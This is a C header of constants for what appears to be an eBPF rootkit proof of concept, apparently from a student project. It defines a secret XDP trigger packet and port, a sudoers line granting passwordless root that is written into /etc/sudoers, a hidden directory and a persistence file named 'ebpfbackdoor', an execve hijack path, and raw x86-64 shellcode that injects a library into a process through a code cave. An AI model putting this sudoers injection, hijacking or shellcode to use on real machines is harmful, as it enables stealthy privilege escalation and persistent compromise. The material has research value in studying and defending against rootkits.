#ifndef __CONSTANTS_H
#define __CONSTANTS_H

//XDP
#define SECRET_PACKET_PAYLOAD "XDP_PoC_0"
#define SECRET_PACKET_DEST_PORT 9000
#define SUBSTITUTION_NEW_PAYLOAD "The previous message has been hidden ;)"


//FS
#define STRING_FS_HIDE "This won't be seen"
#define STRING_FS_OVERWRITE "That is now hidden"

#define STRING_FS_SUDO_TASK "sudo"
#define STRING_FS_SUDO_TASK_LEN 5
#define STRING_FS_SUDOERS_FILE "/etc/sudoers"
#define STRING_FS_SUDOERS_FILE_LEN 13
#define STRING_FS_SUDOERS_ENTRY "osboxes ALL=(ALL:ALL) NOPASSWD:ALL #"
#define STRING_FS_SUDOERS_ENTRY_LEN 37

#define SECRET_DIRECTORY_NAME_HIDE "SECRETDIR"
#define SECRET_FILE_PERSISTENCE_NAME "ebpfbackdoor"

//EXECUTION HIJACKING

#define PATH_EXECUTION_HIJACK_PROGRAM "/home/osboxes/TFG/src/helpers/execve_hijack\0"
#define EXEC_HIJACK_ACTIVE_TEMP 0 //0 Deactivated, 1 active
#define TASK_COMM_NAME_RESTRICT_HIJACK "bash"
#define TASK_COMM_RESTRICT_HIJACK_ACTIVE 1

//LIBRARY INJECTION WITH ROP
#define TASK_COMM_NAME_INJECTION_TARGET_TIMERFD_SETTIME "simple_timer"
#define TASK_COMM_FILTER 1 //0 do not filter by task. 1 filter by task.
#define TASK_COMM_NAME_INJECTION_TARGET_OPEN "simple_open"

#define CODE_CAVE_ADDRESS_STATIC 0x00000000004012c4
#define CODE_CAVE_SHELLCODE_ASSEMBLE_1 \
"\x55\x50\x51\x52\x53\x57\x56\
\xbf\x00\x20\x00\x00\x48\xbb"
#define CODE_CAVE_SHELLCODE_ASSEMBLE_1_LEN 14

#define CODE_CAVE_SHELLCODE_ASSEMBLE_2 \
"\xff\xd3\x48\x89\xc3\xc7\x00\x2f\x68\x6f\x6d\
\xc7\x40\x04\x65\x2f\x6f\x73\xc7\x40\x08\x62\x6f\x78\
\x65\xc7\x40\x0c\x73\x2f\x54\x46\xc7\x40\x10\x47\x2f\
\x73\x72\xc7\x40\x14\x63\x2f\x68\x65\xc7\x40\x18\x6c\
\x70\x65\x72\xc7\x40\x1c\x73\x2f\x69\x6e\xc7\x40\x20\
\x6a\x65\x63\x74\xc7\x40\x24\x69\x6f\x6e\x5f\xc7\x40\
\x28\x6c\x69\x62\x2e\xc7\x40\x2c\x73\x6f\x00\x00\x48\
\xb8"
#define CODE_CAVE_SHELLCODE_ASSEMBLE_2_LEN 90

#define CODE_CAVE_SHELLCODE_ASSEMBLE_3 \
"\xbe\x01\x00\x00\x00\x48\x89\xdf\
\x48\x81\xec\x00\x10\x00\x00\xff\
\xd0\x48\x81\xc4\x00\x10\x00\x00\x5e\
\x5f\x5b\x5a\x59\x58\x5d\xff\x25\x00\x00\x00\x00"
#define CODE_CAVE_SHELLCODE_ASSEMBLE_3_LEN 37

#endif